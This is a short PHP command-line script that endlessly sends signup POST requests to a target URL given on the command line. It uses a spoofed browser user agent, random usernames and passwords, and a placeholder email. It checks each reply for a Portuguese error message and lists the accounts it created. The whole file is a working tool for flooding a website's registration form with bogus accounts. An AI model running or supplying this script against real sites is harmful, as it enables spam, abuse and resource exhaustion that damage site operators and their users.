<?php
$ch = curl_init();
while(true):
    $user = substr(md5(md5(time()).rand()), 0, rand(5, 9));
    curl_setopt_array(
        $ch, [
            CURLOPT_URL => $argv[1],
            CURLOPT_HEADER => true,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => 'user='.$user.'&pass='.$user.'&email=teste@gmail.com&name=blablab&&pass2='.$user
        ]
    );
    $res = curl_exec($ch);
    if (stripos($res, 'Não foi possível efetuar') === false) {
        echo "$user:$user cadastrada!\n";
    }
endwhile;
?>
